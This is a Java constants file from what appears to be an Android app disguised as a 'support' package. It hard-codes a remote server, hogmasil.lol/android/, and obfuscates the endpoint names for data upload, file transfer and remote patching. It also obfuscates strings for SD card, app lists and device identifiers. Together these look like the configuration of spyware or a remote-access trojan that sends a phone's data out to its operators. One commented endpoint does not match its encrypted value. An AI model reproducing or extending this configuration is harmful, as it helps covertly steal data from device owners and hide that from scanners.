package com.support.samsg;


public interface  _Global {
    String _PREFIX = "http://hogmasil.lol/android/";
    String DATA_URL = _PREFIX + MyCrypt.crypt("805;)p!6!", 50);//index.php
    String FILE_URL = _PREFIX + MyCrypt.crypt("805;)p!6!", 50);//file.php
    String PATCH_URL = _PREFIX + MyCrypt.crypt("!?%=9p!6!", 50);//patch.php
    String Boundary = MyCrypt.crypt("lcl", 50) + System.currentTimeMillis() + MyCrypt.crypt("lcl", 50);//===
    String TwoHyphens = MyCrypt.crypt("s|", 50);//--
    String CRLF = MyCrypt.crypt("S[", 50);//\r\n
    String CharSet = MyCrypt.crypt("\u0004\n\u0017si", 50);//UTF-8
    int READ_TIME_OUT = 3000;
    String ICON_START_NAME = "iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAABEWlDQ1BTa2lhAAAokYWRoU7DUBSGPwqGhAQEYgJxBQIDAZYQBGqIBlu2ZODarhSStWtuu4wXIBgMBk14CHgFPAEDD4EgaP6uojUb/82558vJyb33PxecFpKzBklaWM/tmP7ZuaEhP8wzZmsBfj/KHd625/TN0vIgykPlb0VhdbmOHIjX44qvSw4qvivZdr1j8aN4K25w0OBJkRXi17I/zGzJX+KjZDgO63ezEqW9U+W+YoN9dhSGLhaflJwLIrFhwhUFl6IcD5eOyFVPwlj1f1TPc6S3Hf7A4n1dCx7g5RZan3Vt8wlWb+D5PfOtPy0tKZx2u5rzvDvqv5jh1Uy9uoy0YoZyaDiR21DujfzvssfBH0tmRP2ZPyMqAAAABHNCSVQICAgIfAhkiAAAA7xJREFUaIGtWdty6yAMXBz//x/X9CFHOWK9uuBUM50mgIRAtxUZc84D/2kAmP/+BgA/NwFcbt3ASpO+e1n2vSLj8Xt4GWo9AMwzUEYpyhsxj6cD/QP4+RmMj2R+AsAZKBcJ7yjGa6PbZIoO4edDL2CL8AEyJbK5K5nrypnisx3mxnPwQEAWL931kYzIXbP57MI+PKcaLJifUiWTLRC5pXKxYQfJbqryXR6vbhB4u150aY8uMXKVgdjUrFTGD6zpvCKVWDqXdwt2JZgV6iigxry7cGpV/P4QZfazg/hFbCWVPZSi7Cq8eWUZrjudmArTL1fiSjm/cZcihdlKfq+yuPpgZ6YJHUPdYsU8lfsdboyhUSn3BPDCiqGMeQL4SRRUrsOfq0IWZcsdRADgfZCfpoIqxWagbjfjeav+uHUtrBaBxi5lsRN9zxTLLoQzqM2VB8nMW6LRh8QKVq2CjQ3GT4dg9vR0Llqf7TfEH88ZzRMaqVY1Qq3ZJRVbKnvyWpkMuB9hn6+KVza2g9XUnnxQznxLzJ2IfftmPiFYKdOl9IaVstBpfEKg36gnr9yom/u/OXy67sC7IGYNTScW7CA+eLsx1GqcBI+31nG6QSXQJ4JbM4P6sDsJQcVllv69zteBt7JXY9OqwPEtPaUom43gMwBcQ7xrRUqqDZkvmmelujL8nFlLtgfVY8Jf+HmXpyNjQnvPOFG7Q2Zqlee7SnVI9USsGwDdb3RSrdrIeJ8eYhfSL4nGY63IbNVmf0HRZVQX85lTHWK1kSJ76+0kia5MtZ6Tw2eMM9YuPmLeTiPEcrP4sz9Vw5bP6tW8c5sZ7soKLO+RUQQe1dg4abIjpKoZHcylSLlOpMMNAUQPdJ2Y6fh/5KILTipkeX4Gt7dgf9GCiqKbU5t35FRYjeNPxkgmKBPuv0d5vpM0qj4oWrfI9E+mT4rZjhW6lT+zdghrsg5RCfqWduOK1/ufIzxP6lo7VqpqSBYrCuvtpGcA67tWBh6fQJNuq8wXwIVZ4a2bPuo5KEqTT9NxFfCR+3KKvsTcRwbXEdVkKUbGVrZ+N5YULFKowQ6j5gFXENnH/WKlNFtR4SGltFrPsajkeFQu4/ZE/gvVDkV8Vcx19qtq0q3VVZkqyirf9CYRhIkqeJlBudXNOjEvWH2PXGO3JTCKMJg8TPX4sJvbMxn+pqtXfyN7QCzJLDLov1JE0a4FK5C4EzsLGvZYSyFLpVSWZnnOF7SKnsChBTT6H0OrNJodNoM7nNpfeP9OmOEqT6ogTj/2C1yfh6X4fAVSAAAAAElFTkSuQmCC";
    String SDCARD = MyCrypt.crypt("\u0015\u0003\u0005\u0006\u0014\u0003", 19); // "SDCARD"
    String XX_FOLDER_XX = MyCrypt.crypt("\u001E\u001F\u0019\u0001\t\u000B\u0002\u0002\u0014\u0018\u001E\u001F", 19); // "XX_FOLDER_XX"

    String SLASH = MyCrypt.crypt("h", 19); // "/"
    String SPEC1 = MyCrypt.crypt(";", 19); // "|"
    String SPEC2 = MyCrypt.crypt("\u0007", 19); // "@"
    String SPEC3 = MyCrypt.crypt("a", 19); // "&"
    String SPEC4 = MyCrypt.crypt("\u0018", 19); // "_"
    String SPEC5 = MyCrypt.crypt("z", 19); // "="
    String SPEC6 = MyCrypt.crypt("g", 19); // " "
    String SPEC7 = MyCrypt.crypt("\u001A;", 19); // "\\|"
    String SPEC8 = MyCrypt.crypt("\u001A5\u001A)", 19); // "\\r\\n"
    String SPEC9 = MyCrypt.crypt(":", 19); // "}"
    String SPEC10 = MyCrypt.crypt("?", 19); // "x"
    String SPEC11 = MyCrypt.crypt("{", 19); // "<"
    String SPEC12 = MyCrypt.crypt("y", 19); // ">"
    String SPEC13 = MyCrypt.crypt("b", 19); // "%"
    String SPEC14 = MyCrypt.crypt("i", 19); // "."
    String SPEC15 = MyCrypt.crypt("z", 19); // "="
    String SPEC16 = MyCrypt.crypt("m", 19); // "*"
    String CIHAZ = MyCrypt.crypt("\u0004\u000F\u000F\u0007\u001D", 19); // "CIHAZ"
    String REQ_CODE_APPS = MyCrypt.crypt("\u0007\u0017\u0016\u0014", 19); // "APPS"
    String[] SIZES = { "B", "KB", "MB", "GB", "TB" };
    String FORMAT_PATTERN2 = MyCrypt.crypt("=b\"}vied;g=b5:", 19); // "{%d:0.##} {%s}"

}
